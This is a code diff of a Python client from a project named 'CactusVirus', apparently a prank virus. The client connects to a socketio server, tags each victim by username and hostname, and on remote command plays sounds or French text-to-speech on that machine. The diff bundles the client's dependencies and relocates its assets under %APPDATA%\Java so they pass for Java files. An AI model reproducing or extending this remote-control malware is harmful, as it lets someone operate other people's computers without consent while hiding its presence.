@@ -2,17 +2,17 @@ import os
 import socket
 import getpass
 import winsound
-import socketio
 import subprocess
-from gtts import gTTS
+from vendor import gtts
 from vendor import playsound
+from vendor import socketio
 
 io = socketio.Client()
 username = getpass.getuser() + "@" + socket.gethostname()
 
-soundbox_path = r"C:\Users\quent\Desktop\Perso\CactusVirus\Client\assets\Soundbox\\"
-goose_path = r"C:\Users\quent\Desktop\Perso\CactusVirus\Client\assets\Goose\\"
-flash_path = r"C:\Users\quent\Desktop\Perso\CactusVirus\Client\assets\FlashCoucou\\"
+soundbox_path = os.getenv("APPDATA")  + r"\Java\assets\Soundbox\\"
+goose_path = os.getenv("APPDATA")  + r"\Java\assets\Goose\\"
+flash_path = os.getenv("APPDATA")  + r"\Java\assets\FlashCoucou\\"
 soundlist = ["nopal-earrape", "passe-partout", "rene-ballek", "tabarnak", "wii-sport", "pauvre-conne", "patrick-ftg", "losing-horn", "titanic", "nani", "meuh", "fbi", "bien-evidement", "fanta-decision", "padami", "ntm", "spiderman", "colère"]
 flash_coucou = ["flash-jfp", "flash-blanquer", "flash-michel", "flash-jpk"]
 
@@ -39,7 +39,7 @@ def event_triggered(data):
 
     elif "tts\n" in data["event"] and data["user"] == username:
         sentence = data["event"].split("\n")[1]
-        tts = gTTS(sentence, lang="fr")
+        tts = gtts.gTTS(sentence, lang="fr")
         tts.save("sentence.mp3")
         playsound.playsound("sentence.mp3")
         os.remove("sentence.mp3")
